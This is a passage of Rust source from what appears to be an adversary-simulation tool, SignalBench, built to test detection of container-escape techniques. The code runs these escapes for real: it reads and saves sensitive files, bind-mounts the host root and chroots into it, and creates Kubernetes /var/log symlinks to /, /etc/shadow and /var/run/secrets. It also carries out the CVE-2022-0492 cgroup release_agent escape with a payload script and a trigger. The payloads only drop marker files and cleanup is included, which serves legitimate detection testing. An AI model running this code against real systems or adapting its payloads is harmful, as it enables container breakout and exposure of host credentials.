                for (file, desc) in &sensitive_files {
                    info!("[T1611-MOUNT] Executing: cat {}", file);
                    let cat_output = Command::new("cat")
                        .args([*file])
                        .output()
                        .await;
                    
                    match cat_output {
                        Ok(output) => {
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            if output.status.success() {
                                let content_len = output.stdout.len();
                                findings.push(format!("[CRITICAL] cat {} - SUCCESS ({} bytes, {})", file, content_len, desc));
                                
                                // Save to output
                                let safe_name = file.replace("/", "_");
                                let cat_file = format!("{}/cat{}.txt", output_dir, safe_name);
                                if let Ok(mut f) = File::create(&cat_file) {
                                    let _ = f.write_all(output.stdout.as_slice());
                                    artefacts.push(cat_file);
                                }
                            } else {
                                findings.push(format!("[EXEC] cat {} - BLOCKED: {}", file, stderr.trim()));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] cat {} - ERROR: {}", file, e));
                        }
                    }
                }
                
                // ls -la on sensitive directories
                let sensitive_dirs = ["/root", "/etc/ssh", "/var/run/secrets", "/home"];
                for dir in &sensitive_dirs {
                    info!("[T1611-MOUNT] Executing: ls -la {}", dir);
                    let ls_output = Command::new("ls")
                        .args(["-la", *dir])
                        .output()
                        .await;
                    
                    if let Ok(output) = ls_output {
                        if output.status.success() {
                            findings.push(format!("[EXEC] ls -la {} - SUCCESS", dir));
                            let safe_name = dir.replace("/", "_");
                            let ls_file = format!("{}/ls{}.txt", output_dir, safe_name);
                            if let Ok(mut f) = File::create(&ls_file) {
                                let _ = f.write_all(output.stdout.as_slice());
                                artefacts.push(ls_file);
                            }
                        }
                    }
                }
            }
            
            // Attempt write operations
            if test_write {
                let test_file = "/tmp/signalbench_mount_test";
                
                // Try touch on various paths
                let write_paths = [
                    "/etc/signalbench_test",
                    "/root/signalbench_test",
                    "/var/signalbench_test",
                    test_file,
                ];
                
                for path in &write_paths {
                    info!("[T1611-MOUNT] Executing: touch {}", path);
                    let touch_output = Command::new("touch")
                        .args([*path])
                        .output()
                        .await;
                    
                    match touch_output {
                        Ok(output) => {
                            if output.status.success() {
                                findings.push(format!("[CRITICAL] touch {} - SUCCESS (writable!)", path));
                                // Clean up
                                let _ = Command::new("rm").args(["-f", *path]).output().await;
                            } else {
                                findings.push(format!("[EXEC] touch {} - BLOCKED", path));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] touch {} - ERROR: {}", path, e));
                        }
                    }
                }
                
                // Attempt mount --bind
                let bind_target = format!("{}/bind_test", output_dir);
                let _ = fs::create_dir_all(&bind_target);
                
                info!("[T1611-MOUNT] Executing: mount --bind / {}", bind_target);
                let bind_output = Command::new("mount")
                    .args(["--bind", "/", &bind_target])
                    .output()
                    .await;
                
                let mut bind_succeeded = false;
                match bind_output {
                    Ok(output) => {
                        if output.status.success() {
                            findings.push(format!("[CRITICAL] mount --bind / {} - SUCCESS", bind_target));
                            bind_succeeded = true;
                            // Try to read from bind mount
                            if let Ok(ls) = Command::new("ls").args(["-la", &bind_target]).output().await {
                                if ls.status.success() {
                                    findings.push("[ESCAPE] Host root accessible via bind mount!".to_string());
                                }
                            }
                        } else {
                            findings.push("[EXEC] mount --bind / - BLOCKED".to_string());
                        }
                    }
                    Err(e) => {
                        findings.push(format!("[EXEC] mount --bind / - ERROR: {}", e));
                    }
                }
                
                // If bind mount succeeded, create a marker file on the host via chroot
                let host_marker_path: &str = "/tmp/signalbench_mount_escape_marker";
                if bind_succeeded {
                    info!("[T1611-MOUNT] Creating host marker file via chroot into bind mount");
                    let marker_cmd = format!(
                        "touch {} && echo 'SignalBench T1611-MOUNT escape marker - created at '$(date) > {}",
                        host_marker_path, host_marker_path
                    );
                    let chroot_marker = Command::new("chroot")
                        .args([&bind_target, "sh", "-c", &marker_cmd])
                        .output()
                        .await;
                    
                    match chroot_marker {
                        Ok(output) => {
                            if output.status.success() {
                                findings.push(format!("[ESCAPE] Host marker file created via chroot: {}", host_marker_path));
                                findings.push("[ESCAPE] Container escape to host filesystem CONFIRMED!".to_string());
                                // Track the marker path for cleanup (relative to bind mount)
                                artefacts.push(format!("chroot:{}:{}", bind_target, host_marker_path));
                                info!("[T1611-MOUNT] [CRITICAL] Marker file created on host via chroot");
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                findings.push(format!("[EXEC] chroot marker creation - BLOCKED: {}", stderr.trim()));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] chroot marker creation - ERROR: {}", e));
                        }
                    }
                    
                    // Cleanup: unmount bind mount
                    let _ = Command::new("umount").args([&bind_target]).output().await;
                }
                
                // Also try chroot escape if /host mount exists (common Docker pattern)
                if Path::new("/host").exists() {
                    info!("[T1611-MOUNT] Found /host mount - attempting chroot escape");
                    findings.push("[WARNING] /host mount detected - common Docker host mount pattern".to_string());
                    
                    let marker_cmd = format!(
                        "touch {} && echo 'SignalBench T1611-MOUNT escape marker via /host - created at '$(date) > {}",
                        host_marker_path, host_marker_path
                    );
                    let host_chroot = Command::new("chroot")
                        .args(["/host", "sh", "-c", &marker_cmd])
                        .output()
                        .await;
                    
                    match host_chroot {
                        Ok(output) => {
                            if output.status.success() {
                                findings.push(format!("[ESCAPE] Host marker file created via /host chroot: {}", host_marker_path));
                                findings.push("[ESCAPE] Container escape via /host mount CONFIRMED!".to_string());
                                artefacts.push(format!("chroot:/host:{}", host_marker_path));
                                info!("[T1611-MOUNT] [CRITICAL] Marker file created on host via /host chroot");
                            } else {
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                findings.push(format!("[EXEC] /host chroot marker - BLOCKED: {}", stderr.trim()));
                            }
                        }
                        Err(e) => {
                            findings.push(format!("[EXEC] /host chroot marker - ERROR: {}", e));
                        }
                    }
                }
            }
            
            // Check for Docker socket via mount
            for mount in &mounts {
                if mount.target.contains("docker.sock") || mount.source.contains("docker.sock") {
                    findings.push(format!("[CRITICAL] Docker socket mounted: {} -> {}", mount.source, mount.target));
                }
            }
            
            // =========================================================
            // Kubernetes /var/log symlink attack (Unit42 technique)
            // In K8s environments with hostPath logs, symlinking /var/log 
            // entries can expose host filesystem to privileged log readers
            // =========================================================
            
            info!("[T1611-MOUNT] Executing: Kubernetes /var/log symlink attack");
            
            let k8s_log_dir = "/var/log";
            let symlink_marker = "/var/log/signalbench_k8s_escape";
            let symlink_target = "/"; // Symlink to root filesystem
            
            // Check if /var/log is writable (common in K8s pods with hostPath: /var/log)
            let log_test = format!("{}/signalbench_write_test", k8s_log_dir);
            let write_test = Command::new("touch")
                .args([&log_test])
                .output()
                .await;
            
            match write_test {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[WARNING] /var/log is writable - K8s symlink attack possible".to_string());
                        info!("[T1611-MOUNT] /var/log is writable - attempting symlink attack");
                        
                        // Clean up write test
                        let _ = Command::new("rm").args(["-f", &log_test]).output().await;
                        
                        // Create symlink to root filesystem
                        // This is the actual attack: ln -s / /var/log/signalbench_root
                        info!("[T1611-MOUNT] Executing: ln -s {} {}", symlink_target, symlink_marker);
                        let symlink_result = Command::new("ln")
                            .args(["-sf", symlink_target, symlink_marker])
                            .output()
                            .await;
                        
                        match symlink_result {
                            Ok(output) => {
                                if output.status.success() {
                                    findings.push(format!("[CRITICAL] K8s /var/log symlink created: {} -> {}", symlink_marker, symlink_target));
                                    findings.push("[ESCAPE] K8s log reader can now access host root via this symlink!".to_string());
                                    info!("[T1611-MOUNT] [CRITICAL] K8s symlink escape created: {} -> {}", symlink_marker, symlink_target);
                                    artefacts.push(format!("symlink:{}", symlink_marker));
                                    
                                    // Verify symlink is accessible
                                    let ls_output = Command::new("ls")
                                        .args(["-la", symlink_marker])
                                        .output()
                                        .await;
                                    
                                    if let Ok(ls) = ls_output {
                                        if ls.status.success() {
                                            let ls_result = String::from_utf8_lossy(&ls.stdout);
                                            findings.push(format!("[VERIFY] Symlink accessible: {}", ls_result.trim()));
                                            
                                            // Try to list through the symlink
                                            let through_output = Command::new("ls")
                                                .args([&format!("{}/etc", symlink_marker)])
                                                .output()
                                                .await;
                                            
                                            if let Ok(through) = through_output {
                                                if through.status.success() {
                                                    findings.push("[ESCAPE] Can traverse through symlink to /etc".to_string());
                                                    info!("[T1611-MOUNT] [CRITICAL] Symlink traversal to /etc successful");
                                                }
                                            }
                                        }
                                    }
                                    
                                    // Create additional symlinks for common K8s escape targets
                                    let additional_symlinks = [
                                        ("/etc/shadow", "signalbench_k8s_shadow"),
                                        ("/root", "signalbench_k8s_root"),
                                        ("/var/run/secrets", "signalbench_k8s_secrets"),
                                    ];
                                    
                                    for (target, name) in &additional_symlinks {
                                        let symlink_path = format!("{}/{}", k8s_log_dir, name);
                                        info!("[T1611-MOUNT] Executing: ln -s {} {}", target, symlink_path);
                                        let sym_result = Command::new("ln")
                                            .args(["-sf", *target, &symlink_path])
                                            .output()
                                            .await;
                                        
                                        if let Ok(out) = sym_result {
                                            if out.status.success() {
                                                findings.push(format!("[CRITICAL] Additional symlink: {} -> {}", symlink_path, target));
                                                artefacts.push(format!("symlink:{}", symlink_path));
                                            }
                                        }
                                    }
                                } else {
                                    let stderr = String::from_utf8_lossy(&output.stderr);
                                    findings.push(format!("[EXEC] K8s symlink creation - BLOCKED: {}", stderr.trim()));
                                }
                            }
                            Err(e) => {
                                findings.push(format!("[EXEC] K8s symlink creation - ERROR: {}", e));
                            }
                        }
                    } else {
                        findings.push("[SAFE] /var/log is not writable - K8s symlink attack not possible".to_string());
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] /var/log write test - ERROR: {}", e));
                }
            }
            
            // Also check for existing suspicious symlinks in /var/log (indicator of previous attack)
            info!("[T1611-MOUNT] Scanning /var/log for suspicious symlinks");
            let find_symlinks = Command::new("find")
                .args([k8s_log_dir, "-type", "l", "-maxdepth", "1"])
                .output()
                .await;
            
            if let Ok(output) = find_symlinks {
                if output.status.success() {
                    let symlinks = String::from_utf8_lossy(&output.stdout);
                    for symlink in symlinks.lines() {
                        if !symlink.is_empty() && !symlink.contains("signalbench") {
                            // Check where each symlink points
                            if let Ok(readlink) = Command::new("readlink").args([symlink]).output().await {
                                if readlink.status.success() {
                                    let target = String::from_utf8_lossy(&readlink.stdout);
                                    let target = target.trim();
                                    // Flag if symlink points outside /var/log
                                    if !target.starts_with("/var/log") && !target.is_empty() {
                                        findings.push(format!("[WARNING] Suspicious symlink in /var/log: {} -> {}", symlink, target));
                                    }
                                }
                            }
                        }
                    }
                }
            }
            
            // Write mount dump
            let mounts_file = format!("{}/mounts.txt", output_dir);
            if let Ok(mut f) = File::create(&mounts_file) {
                let mut mounts_dump = String::from("Mount Points\n");
                mounts_dump.push_str(&"=".repeat(50));
                mounts_dump.push('\n');
                for mount in &mounts {
                    mounts_dump.push_str(&format!("{} -> {} ({}) [{}]\n", 
                        mount.source, mount.target, mount.fstype, mount.options));
                }
                let _ = f.write_all(mounts_dump.as_bytes());
                artefacts.push(mounts_file);
            }
            
            // Write findings report
            let report_file = format!("{}/mount_escape_report.txt", output_dir);
            if let Ok(mut f) = File::create(&report_file) {
                let container_env = detect_container_environment_with_prefix("T1611-MOUNT");
                let report = format!(
                    "SignalBench T1611-MOUNT - Sensitive Mount Escape Report\n{}\n\nContainer Environment:\n  Is Container: {}\n  Runtime: {:?}\n\nTotal Mounts: {}\nSensitive Mounts: {}\n\nFindings:\n{}\n",
                    "=".repeat(55),
                    container_env.is_container,
                    container_env.runtime,
                    mounts.len(),
                    sensitive_mounts.len(),
                    findings.join("\n")
                );
                let _ = f.write_all(report.as_bytes());
                artefacts.push(report_file);
            }
            
            let escape_possible = !sensitive_mounts.is_empty();
            let message = if escape_possible {
                format!("Sensitive mount escape vectors detected: {} dangerous mounts found", sensitive_mounts.len())
            } else {
                "No sensitive mount escape vectors detected - mounts appear properly isolated".to_string()
            };
            
            info!("[T1611-MOUNT] Technique complete: {}", message);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message,
                artifacts: artefacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artefacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1611-MOUNT] Starting cleanup of {} artefacts", artefacts.len());
            
            for artefact in artefacts {
                // Special handling for symlink artefacts (format: "symlink:<path>")
                if let Some(symlink_path) = artefact.strip_prefix("symlink:") {
                    debug!("[T1611-MOUNT] Removing symlink: {}", symlink_path);
                    
                    // Use rm -f to remove symlinks (fs::remove_file also works for symlinks)
                    let rm_result = Command::new("rm")
                        .args(["-f", symlink_path])
                        .output()
                        .await;
                    
                    match rm_result {
                        Ok(output) => {
                            if output.status.success() {
                                info!("[T1611-MOUNT] Removed K8s escape symlink: {}", symlink_path);
                            } else {
                                // Fallback: try fs::remove_file
                                let path = Path::new(symlink_path);
                                if path.is_symlink() {
                                    if let Err(e) = fs::remove_file(path) {
                                        warn!("[T1611-MOUNT] Failed to remove symlink {}: {}", symlink_path, e);
                                    }
                                }
                            }
                        }
                        Err(_) => {
                            // Fallback: try fs::remove_file
                            let path = Path::new(symlink_path);
                            if path.is_symlink() {
                                if let Err(e) = fs::remove_file(path) {
                                    debug!("[T1611-MOUNT] Could not remove symlink {}: {}", symlink_path, e);
                                }
                            }
                        }
                    }
                    continue;
                }
                
                // Special handling for chroot marker files (format: "chroot:<root>:<path>")
                if artefact.starts_with("chroot:") {
                    let parts: Vec<&str> = artefact.splitn(3, ':').collect();
                    if parts.len() == 3 {
                        let chroot_root = parts[1];
                        let marker_path = parts[2];
                        debug!("[T1611-MOUNT] Removing host marker file via chroot to {}", chroot_root);
                        
                        // First, need to re-mount if not /host
                        let need_remount = !Path::new(chroot_root).exists() || chroot_root != "/host";
                        
                        if need_remount && chroot_root != "/host" {
                            // Re-mount for cleanup
                            let _ = fs::create_dir_all(chroot_root);
                            let _ = Command::new("mount")
                                .args(["--bind", "/", chroot_root])
                                .output()
                                .await;
                        }
                        
                        // Remove marker file via chroot
                        let cleanup_result = Command::new("chroot")
                            .args([chroot_root, "rm", "-f", marker_path])
                            .output()
                            .await;
                        
                        match cleanup_result {
                            Ok(output) => {
                                if output.status.success() {
                                    info!("[T1611-MOUNT] Removed host marker file: {}", marker_path);
                                } else {
                                    // Fallback: try local removal
                                    if let Err(e) = fs::remove_file(marker_path) {
                                        warn!("[T1611-MOUNT] Failed to remove host marker {}: {}", marker_path, e);
                                    }
                                }
                            }
                            Err(_) => {
                                // Fallback: try local removal
                                if let Err(e) = fs::remove_file(marker_path) {
                                    debug!("[T1611-MOUNT] Could not remove host marker {}: {}", marker_path, e);
                                }
                            }
                        }
                        
                        // Unmount if we remounted
                        if need_remount && chroot_root != "/host" {
                            let _ = Command::new("umount").args([chroot_root]).output().await;
                        }
                        continue;
                    }
                }
                
                let path = Path::new(artefact);
                if path.is_dir() {
                    debug!("[T1611-MOUNT] Removing directory: {}", artefact);
                    if let Err(e) = fs::remove_dir_all(path) {
                        warn!("[T1611-MOUNT] Failed to remove directory {}: {}", artefact, e);
                    }
                } else if path.is_file() {
                    debug!("[T1611-MOUNT] Removing file: {}", artefact);
                    if let Err(e) = fs::remove_file(path) {
                        warn!("[T1611-MOUNT] Failed to remove file {}: {}", artefact, e);
                    }
                }
            }
            
            info!("[T1611-MOUNT] Cleanup complete");
            Ok(())
        })
    }
}

// =============================================================================
// T1611-CGROUP: cgroup Release Agent Escape
// =============================================================================

pub struct CgroupReleaseAgentEscape {}

#[async_trait]
impl AttackTechnique for CgroupReleaseAgentEscape {
    fn info(&self) -> Technique {
        Technique {
            id: "T1611-CGROUP".to_string(),
            name: "cgroup Release Agent Escape".to_string(),
            description: "Container escape via cgroup release_agent mechanism (CVE-2022-0492). Runs mount -t cgroup, mkdir cgroup directories, echo to notify_on_release and release_agent files, cat /proc/self/cgroup, ls -la on cgroup paths. Attempts to create cgroups and set release agents. All operations are safe and reversible.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory for cgroup escape simulation output".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_cgroup_escape".to_string()),
                },
                TechniqueParameter {
                    name: "simulate_payload".to_string(),
                    description: "Create simulated payload script (not executed)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "attempt_cgroup_mount".to_string(),
                    description: "Attempt to mount cgroup filesystem".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for: mount -t cgroup commands, mkdir in cgroup paths, echo to notify_on_release and release_agent, cat /proc/self/cgroup, cgroup namespace operations. Alert on CVE-2022-0492 patterns.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let output_dir = config
                .parameters
                .get("output_dir")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_cgroup_escape".to_string());
            
            let simulate_payload = config
                .parameters
                .get("simulate_payload")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            debug!("[T1611-CGROUP] Starting cgroup Release Agent Escape technique");
            debug!("[T1611-CGROUP] Output directory: {}", output_dir);
            debug!("[T1611-CGROUP] Simulate payload: {}", simulate_payload);
            
            let mut artefacts = Vec::new();
            let mut findings = Vec::new();
            
            // Check capabilities
            let caps = parse_capabilities_with_prefix("T1611-CGROUP");
            let has_sys_admin = has_capability(&caps, CAP_SYS_ADMIN);
            
            debug!("[T1611-CGROUP] CAP_SYS_ADMIN present: {}", has_sys_admin);
            
            let attempt_cgroup_mount = config
                .parameters
                .get("attempt_cgroup_mount")
                .map(|v| v.to_lowercase() == "true")
                .unwrap_or(true);
            
            if dry_run {
                info!("[DRY RUN] Would perform cgroup Release Agent Escape:");
                info!("[DRY RUN] - Execute: cat /proc/self/cgroup");
                info!("[DRY RUN] - Execute: ls -la /sys/fs/cgroup");
                info!("[DRY RUN] - Execute: findmnt -t cgroup,cgroup2");
                if attempt_cgroup_mount {
                    info!("[DRY RUN] - Execute: mount -t cgroup -o rdma cgroup /tmp/cgrp");
                    info!("[DRY RUN] - Execute: mkdir /tmp/cgrp/x");
                    info!("[DRY RUN] - Execute: echo 1 > /tmp/cgrp/x/notify_on_release");
                    info!("[DRY RUN] - Execute: echo /path/payload > /tmp/cgrp/release_agent");
                }
                if simulate_payload {
                    info!("[DRY RUN] - Create simulated escape payload script");
                }
                info!("[DRY RUN] - Write findings to: {}", output_dir);
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform cgroup release agent escape".to_string(),
                    artifacts: vec![output_dir],
                    cleanup_required: false,
                });
            }
            
            // Create output directory
            debug!("[T1611-CGROUP] Creating output directory");
            if let Err(e) = fs::create_dir_all(&output_dir) {
                warn!("[T1611-CGROUP] Failed to create output directory: {}", e);
            } else {
                artefacts.push(output_dir.clone());
            }
            
            // Check CAP_SYS_ADMIN
            if has_sys_admin {
                findings.push("[CRITICAL] CAP_SYS_ADMIN present - cgroup escape potentially possible".to_string());
                info!("[T1611-CGROUP] CAP_SYS_ADMIN capability detected");
            } else {
                findings.push("[SAFE] CAP_SYS_ADMIN not present - cgroup escape not possible".to_string());
                debug!("[T1611-CGROUP] No CAP_SYS_ADMIN - escape not feasible");
            }
            
            // =========================================================
            // Execute commands for telemetry
            // =========================================================
            
            // =========================================================
            // Unit42 Step: Query /etc/mtab to find host overlay path
            // This is a key detection indicator from the Unit42 research
            // "The absolute path of the root directory can be obtained 
            // by querying the /etc/mtab file from within the container"
            // =========================================================
            
            let mut host_overlay_path: Option<String> = None;
            
            info!("[T1611-CGROUP] Executing: cat /etc/mtab (Unit42 host path discovery)");
            let mtab_output = Command::new("cat")
                .args(["/etc/mtab"])
                .output()
                .await;
            
            match mtab_output {
                Ok(output) => {
                    if output.status.success() {
                        let mtab_content = String::from_utf8_lossy(&output.stdout);
                        findings.push("[EXEC] cat /etc/mtab - SUCCESS (host path discovery)".to_string());
                        
                        // Save mtab content for analysis
                        let mtab_file = format!("{}/etc_mtab.txt", output_dir);
                        if let Ok(mut f) = File::create(&mtab_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(mtab_file);
                        }
                        
                        // Parse overlay mount to find host path (e.g., overlay on / type overlay (...,upperdir=/var/lib/docker/overlay2/xxx/diff,...))
                        for line in mtab_content.lines() {
                            debug!("[T1611-CGROUP] mtab line: {}", line);
                            
                            if line.contains("overlay") && line.contains("upperdir=") {
                                // Extract upperdir path
                                if let Some(upperdir_start) = line.find("upperdir=") {
                                    let path_start = upperdir_start + 9;
                                    let rest = &line[path_start..];
                                    if let Some(path_end) = rest.find(',').or_else(|| rest.find(')')) {
                                        let upperdir = &rest[..path_end];
                                        host_overlay_path = Some(upperdir.to_string());
                                        findings.push(format!("[CRITICAL] Host overlay upperdir found: {}", upperdir));
                                        info!("[T1611-CGROUP] [CRITICAL] Discovered host path from /etc/mtab: {}", upperdir);
                                    }
                                }
                            }
                            
                            // Also look for workdir as alternative
                            if host_overlay_path.is_none() && line.contains("workdir=") {
                                if let Some(workdir_start) = line.find("workdir=") {
                                    let path_start = workdir_start + 8;
                                    let rest = &line[path_start..];
                                    if let Some(path_end) = rest.find(',').or_else(|| rest.find(')')) {
                                        let workdir = &rest[..path_end];
                                        // workdir is typically /var/lib/docker/overlay2/xxx/work
                                        // Convert to diff directory
                                        let diff_path = workdir.replace("/work", "/diff");
                                        host_overlay_path = Some(diff_path.clone());
                                        findings.push(format!("[CRITICAL] Host overlay workdir found: {} -> {}", workdir, diff_path));
                                        info!("[T1611-CGROUP] [CRITICAL] Discovered host path from workdir: {}", diff_path);
                                    }
                                }
                            }
                        }
                        
                        if host_overlay_path.is_none() {
                            findings.push("[INFO] No overlay mount found in /etc/mtab - may not be in container or using different storage driver".to_string());
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] cat /etc/mtab - ERROR: {}", e));
                }
            }
            
            // Also check /proc/self/mountinfo for more detailed mount information
            info!("[T1611-CGROUP] Executing: cat /proc/self/mountinfo (alternative host path discovery)");
            let mountinfo_output = Command::new("cat")
                .args(["/proc/self/mountinfo"])
                .output()
                .await;
            
            match mountinfo_output {
                Ok(output) => {
                    if output.status.success() {
                        let mountinfo_content = String::from_utf8_lossy(&output.stdout);
                        findings.push("[EXEC] cat /proc/self/mountinfo - SUCCESS".to_string());
                        
                        // Save mountinfo content
                        let mountinfo_file = format!("{}/proc_mountinfo.txt", output_dir);
                        if let Ok(mut f) = File::create(&mountinfo_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(mountinfo_file);
                        }
                        
                        // Look for root mount with overlay
                        for line in mountinfo_content.lines() {
                            if line.contains(" / ") && line.contains("overlay") {
                                findings.push(format!("[INFO] Root overlay mount: {}", 
                                    if line.len() > 100 { &line[..100] } else { line }));
                                debug!("[T1611-CGROUP] Root overlay mount found in mountinfo");
                            }
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] cat /proc/self/mountinfo - ERROR: {}", e));
                }
            }
            
            // 1. cat /proc/self/cgroup - Show current cgroup membership
            info!("[T1611-CGROUP] Executing: cat /proc/self/cgroup");
            let cgroup_output = Command::new("cat")
                .args(["/proc/self/cgroup"])
                .output()
                .await;
            
            match cgroup_output {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] cat /proc/self/cgroup - SUCCESS".to_string());
                        let cgroup_file = format!("{}/self_cgroup.txt", output_dir);
                        if let Ok(mut f) = File::create(&cgroup_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(cgroup_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] cat /proc/self/cgroup - ERROR: {}", e));
                }
            }
            
            // 2. ls -la /sys/fs/cgroup - List cgroup hierarchy
            info!("[T1611-CGROUP] Executing: ls -la /sys/fs/cgroup");
            let ls_cgroup = Command::new("ls")
                .args(["-la", "/sys/fs/cgroup"])
                .output()
                .await;
            
            match ls_cgroup {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] ls -la /sys/fs/cgroup - SUCCESS".to_string());
                        let ls_file = format!("{}/cgroup_listing.txt", output_dir);
                        if let Ok(mut f) = File::create(&ls_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(ls_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] ls -la /sys/fs/cgroup - ERROR: {}", e));
                }
            }
            
            // 3. findmnt -t cgroup,cgroup2 - Find cgroup mounts
            info!("[T1611-CGROUP] Executing: findmnt -t cgroup,cgroup2");
            let findmnt_output = Command::new("findmnt")
                .args(["-t", "cgroup,cgroup2"])
                .output()
                .await;
            
            match findmnt_output {
                Ok(output) => {
                    if output.status.success() {
                        findings.push("[EXEC] findmnt -t cgroup,cgroup2 - SUCCESS".to_string());
                        let findmnt_file = format!("{}/cgroup_mounts.txt", output_dir);
                        if let Ok(mut f) = File::create(&findmnt_file) {
                            let _ = f.write_all(output.stdout.as_slice());
                            artefacts.push(findmnt_file);
                        }
                    }
                }
                Err(e) => {
                    findings.push(format!("[EXEC] findmnt cgroup - ERROR: {}", e));
                }
            }
            
            // Attempt cgroup operations
            if attempt_cgroup_mount {
                let cgroup_test_dir = format!("{}/cgrp", output_dir);
                let cgroup_test_subdir = format!("{}/x", cgroup_test_dir);
                
                // 4. mkdir cgroup test directory
                let _ = fs::create_dir_all(&cgroup_test_dir);
                
                // 5. mount -t cgroup -o rdma cgroup
                info!("[T1611-CGROUP] Executing: mount -t cgroup -o rdma cgroup {}", cgroup_test_dir);
                let mount_cgroup = Command::new("mount")
                    .args(["-t", "cgroup", "-o", "rdma", "cgroup", &cgroup_test_dir])
                    .output()
                    .await;
                
                match mount_cgroup {
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        if output.status.success() {
                            findings.push("[CRITICAL] mount -t cgroup - SUCCESS (cgroup mounted!)".to_string());
                            artefacts.push(cgroup_test_dir.clone());
                            
                            // 6. mkdir cgroup/x - Create cgroup
                            info!("[T1611-CGROUP] Executing: mkdir {}", cgroup_test_subdir);
                            let _ = fs::create_dir_all(&cgroup_test_subdir);
                            
                            // 7. echo 1 > notify_on_release
                            let notify_path = format!("{}/notify_on_release", cgroup_test_subdir);
                            info!("[T1611-CGROUP] Executing: echo 1 > {}", notify_path);
                            let notify_result = Command::new("bash")
                                .args(["-c", &format!("echo 1 > {}", notify_path)])
                                .output()
                                .await;
                            
                            if let Ok(output) = notify_result {
                                if output.status.success() {
                                    findings.push("[CRITICAL] echo 1 > notify_on_release - SUCCESS".to_string());
                                } else {
                                    findings.push("[EXEC] echo 1 > notify_on_release - BLOCKED".to_string());
                                }
                            }
                            
                            // 8. Read release_agent path
                            let release_agent_path = format!("{}/release_agent", cgroup_test_dir);
                            if Path::new(&release_agent_path).exists() {
                                info!("[T1611-CGROUP] Executing: cat {}", release_agent_path);
                                if let Ok(content) = fs::read_to_string(&release_agent_path) {
                                    findings.push(format!("[INFO] Current release_agent: '{}'", content.trim()));
                                }
                                
                                // 9. Create and set release_agent payload for intrusive escape test
                                let host_marker_path: &str = "/tmp/signalbench_cgroup_escape_marker";
                                let actual_payload_path = format!("{}/cgroup_escape_payload.sh", output_dir);
                                
                                // Create the actual payload script that creates a marker file
                                info!("[T1611-CGROUP] Creating release_agent payload script");
                                let payload_content = format!(
                                    "#!/bin/sh\n# SignalBench T1611-CGROUP escape marker creation\ntouch {} && echo 'SignalBench T1611-CGROUP escape marker - CVE-2022-0492 - created at '$(date) > {}\n",
                                    host_marker_path, host_marker_path
                                );
                                if let Err(e) = fs::write(&actual_payload_path, &payload_content) {
                                    findings.push(format!("[EXEC] payload creation - ERROR: {}", e));
                                } else {
                                    artefacts.push(actual_payload_path.clone());
                                    findings.push(format!("[INFO] Payload script created: {}", actual_payload_path));
                                    
                                    // Make payload executable
                                    let _ = Command::new("chmod").args(["+x", &actual_payload_path]).output().await;
                                }
                                
                                // Write payload path to release_agent
                                info!("[T1611-CGROUP] Executing: echo {} > {}", actual_payload_path, release_agent_path);
                                let release_result = Command::new("bash")
                                    .args(["-c", &format!("echo {} > {}", actual_payload_path, release_agent_path)])
                                    .output()
                                    .await;
                                
                                let mut release_agent_set = false;
                                if let Ok(output) = release_result {
                                    if output.status.success() {
                                        findings.push("[CRITICAL] echo payload > release_agent - SUCCESS (ESCAPE POSSIBLE!)".to_string());
                                        release_agent_set = true;
                                    } else {
                                        findings.push("[EXEC] echo payload > release_agent - BLOCKED".to_string());
                                    }
                                }
                                
                                // Trigger release_agent by creating and removing a process in the cgroup
                                if release_agent_set {
                                    info!("[T1611-CGROUP] Triggering release_agent via cgroup process lifecycle");
                                    
                                    // Write our PID to cgroup.procs to move into the cgroup
                                    let cgroup_procs = format!("{}/cgroup.procs", cgroup_test_subdir);
                                    let trigger_cmd = format!(
                                        "sh -c 'echo $$ > {} && exit 0' 2>/dev/null || true",
                                        cgroup_procs
                                    );
                                    let trigger_result = Command::new("bash")
                                        .args(["-c", &trigger_cmd])
                                        .output()
                                        .await;
                                    
                                    if let Ok(output) = trigger_result {
                                        if output.status.success() {
                                            findings.push("[CRITICAL] cgroup.procs trigger - SUCCESS".to_string());
                                            
                                            // Give release_agent time to execute
                                            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                                            
                                            // Check if marker file was created
                                            if Path::new(host_marker_path).exists() {
                                                findings.push(format!("[ESCAPE] Host marker file created via release_agent: {}", host_marker_path));
                                                findings.push("[ESCAPE] CVE-2022-0492 container escape CONFIRMED!".to_string());
